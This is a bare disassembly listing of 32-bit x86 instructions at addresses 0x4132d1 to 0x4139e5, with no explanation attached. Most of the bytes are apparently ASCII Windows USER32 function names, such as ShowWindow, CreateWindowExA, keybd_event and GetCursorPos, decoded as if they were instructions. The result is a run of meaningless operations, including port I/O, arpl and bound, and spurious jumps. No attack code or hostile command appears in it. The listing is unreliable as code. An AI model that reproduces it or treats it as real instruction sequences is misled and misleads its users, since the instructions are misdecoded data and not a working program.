  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
